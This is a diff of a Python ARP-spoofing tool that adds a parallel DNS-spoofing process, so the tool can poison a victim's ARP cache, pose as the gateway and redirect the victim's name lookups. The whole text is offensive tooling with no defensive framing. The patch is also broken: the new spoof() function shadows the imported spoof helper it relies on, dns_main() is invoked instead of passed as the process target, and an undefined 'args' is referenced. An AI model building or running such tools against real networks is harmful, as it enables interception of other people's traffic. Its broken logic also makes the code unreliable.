@@ -4,7 +4,9 @@ import argparse
 import time
 import os
 import sys
+import multiprocessing
 from arp_spoofer import spoof, restore, enable_ip_routing
+from dns_spoofer import dns_main
 
 sys.exit("Use the -h parameter to learn about using the program.") if len(sys.argv[1:]) == 0 else True
 
@@ -34,16 +36,10 @@ def dns_check():
         sys.exit("DNS spoofing is only available for machines running a Linux distro.")
 
 
-def main():
+def spoof():
+
     # Get target and host
     target, host = get_arguments()
-
-    # Check DNS compatibility
-    dns_check()
-
-    # Enable ip forwarding for the system
-    enable_ip_routing()
-
     try:
         while True:
             # Tell the victim that we are the gateway
@@ -59,6 +55,21 @@ def main():
         print("[!!!] CTRL + C detected. Cleaning up. Please wait.")
         restore(target, host)
         restore(host, target)
+        
+        
+def main():
+    # Check DNS compatibility
+    dns_check()
+
+    # Enable ip forwarding for the system
+    enable_ip_routing()
+
+    arper = multiprocessing.Process(target=spoof)
+    arper.start()
+
+    if args.dns_spoof:
+        dns_spoofer = multiprocessing.Process(target=dns_main())
+        dns_spoofer.start()
 
 
 if __name__ == '__main__':
